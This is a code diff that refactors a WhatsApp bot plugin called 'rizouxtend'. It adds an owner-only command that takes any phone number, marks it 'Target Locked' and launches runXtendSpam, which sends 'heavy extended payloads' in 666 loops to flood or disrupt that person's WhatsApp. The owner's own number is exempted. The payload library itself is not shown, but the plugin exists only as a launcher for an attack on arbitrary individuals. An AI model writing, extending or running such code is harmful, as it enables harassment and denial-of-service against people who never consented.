@@ -1,31 +1,44 @@
-const { runXtendSpam } = require('../lib/rizouxtend');
+// plugins/rizouxtend.js
+const { cmd } = require("../arslan");
+let { runXtendSpam } = require('../lib/rizouxtend');
 
-module.exports = {
-  name: "rizouxtend",
-  commands: ['xtend', 'rizouxtend', 'inrespext'],
-  category: "owner",
-  description: "Extend core runtime parameters",
-  async execute(sock, m, args) {
+let handler = async (m, { conn, args, command, isCreator }) => {
+    if (!isCreator) return m.reply('🔒 *Owner Only - Xtend Command!*');
+
     if (!args[0]) {
-      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .xtend 923xx` }, { quoted: m });
+        return m.reply(`📌 *Usage:* .${command} 923xx`);
     }
 
     let pepec = (args[0] || "").replace(/[^0-9]/g, "");
-    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });
+
+    if (!pepec) {
+        return m.reply('❌ *Invalid number format!*');
+    }
 
     let protectedNumbers = ["923154734548"];
     if (protectedNumbers.includes(pepec)) {
-      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
+        return m.reply('🔒 *This number is protected!*');
     }
 
     let target = pepec + '@s.whatsapp.net';
-    await sock.sendMessage(m.chat, { text: `🔥 *inRespXtend Target Locked:* ${pepec}\n⚡ *Spamming heavy extended payloads...*` }, { quoted: m });
+
+    await m.reply(`🔥 *inRespXtend Target Locked:* ${pepec}\n⚡ *Spamming heavy extended payloads (666 loops)...*`);
 
     try {
-      runXtendSpam(sock, target);
-      await sock.sendMessage(m.chat, { react: { text: "💥", key: m.key } });
+        // Background mein execution chala rahe hain taaki bot hang na ho
+        runXtendSpam(conn, target);
+
+        await conn.sendMessage(m.chat, {
+            react: { text: "💥", key: m.key }
+        });
+
     } catch (error) {
-      await sock.sendMessage(m.chat, { text: "⚠️ Error: inRespXtend execute karte waqt masla aaya hai." }, { quoted: m });
+        console.error("Xtend Plugin Error:", error);
+        m.reply("⚠️ Error: inRespXtend execute karte waqt masla aaya hai.");
     }
-  }
-};
+}
+
+handler.command = ['xtend', 'rizouxtend', 'inrespext'];
+handler.tags = ['owner', 'rizo'];
+handler.help = ['xtend 923xx'];
+module.exports = handler;
